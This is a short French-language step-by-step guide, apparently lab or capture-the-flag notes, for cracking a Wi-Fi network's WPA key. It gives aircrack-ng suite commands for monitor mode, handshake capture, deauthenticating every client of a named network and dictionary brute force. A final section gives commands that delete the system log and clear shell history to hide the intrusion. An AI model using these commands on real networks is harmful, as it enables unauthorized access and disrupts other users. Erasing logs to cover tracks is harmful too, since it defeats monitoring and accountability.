# Explication 

## 1 - Handshake + bruteforce

### Récupérer handshake :

Passage en mode monitor : airmon-ng start wlan0
Écoute du trafic alentour : airodump-ng wlan0mon => récupère le BSSID et le channel de SRIOEYE1
Ecoute sur channel : iwconfig wlan0mon channel <num_channel>
Capture pour récupérer le handshake : airodump-ng –bssid <bssid> -c <num_channel> -w log wlan0mon
Forcer la déconnexion de tout le monde : aireplay-ng -0 0 -a <bssid> wlan0mon

### Brute Force :

aircrack-ng log-01.cap -w dico.txt

## 2 - Supprimer ses traces

rm /var/sys/syslog ou alors history -c
